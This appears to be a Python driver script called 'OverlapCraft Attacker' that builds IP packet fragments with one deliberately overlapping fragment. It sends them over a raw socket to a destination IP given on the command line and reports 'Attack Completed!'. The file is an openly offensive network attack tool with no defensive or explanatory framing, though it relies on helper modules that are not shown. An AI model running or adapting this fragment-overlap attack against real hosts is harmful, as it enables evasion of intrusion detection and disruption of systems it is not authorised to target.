# Attacker (Version 1) Code:

import sys
from helper_functs.attackParam import attackParamGen, attackParam
from helper_functs.ipHeadFieldGen import ipHeadFieldGen
from helper_functs.rawsocket import rawSockGen

while True:
    print("\nThe OverlapCraft Attacker (Version 1.0)\n")
    if len(sys.argv)!=3:
        if (len(sys.argv)==1):
            print("! Error: Both Source and Destination IP address are missing. Please enter them in order and try again!")
        elif (len(sys.argv)==2):
            print("! Error: Destination IP address is missing. Please enter it and try again!")
        else:
            print("! Error: Too many arguments provided. Please enter only Soruce and Destination IP address and try again!")

        sys.exit(1)
    else:
        srcIP=sys.argv[1] 
        dstIP=sys.argv[2]
        break

attackParams,overlapInd=attackParamGen(srcIP,dstIP)

rawSock=rawSockGen();

for i in range(len(attackParams.allFragms)): #For each fragment, build the IP header add the pre-built payload and send it to the target destination address
    frag=attackParams.allFragms[i]

    if (i==(len(attackParams.allFragms)-1)):
        isLastFrag=True
    else:
        isLastFrag=False

    ipHeadPacket=ipHeadFieldGen(attackParams.srcIPAddr,attackParams.destIPAddr,attackParams.IDField,attackParams.TTL,attackParams.protoField,frag["fragSize"],frag["fragOffset"],isLastFrag)

    ipPacket=ipHeadPacket + frag["fragPayload"]
    rawSock.sendto(ipPacket, (attackParams.destIPAddr,0))
    if (i==overlapInd):
       print(f"[Frag {i+1}] size={frag['fragSize']}, offset={frag['fragOffset']}, MF={0 if isLastFrag else 1} ---> Overlapping Fragment")
    else:
       print(f"[Frag {i+1}] size={frag['fragSize']}, offset={frag['fragOffset']}, MF={0 if isLastFrag else 1}")

print(f"=> Fragments sent with ID={attackParams.IDField}. Attack Completed!") 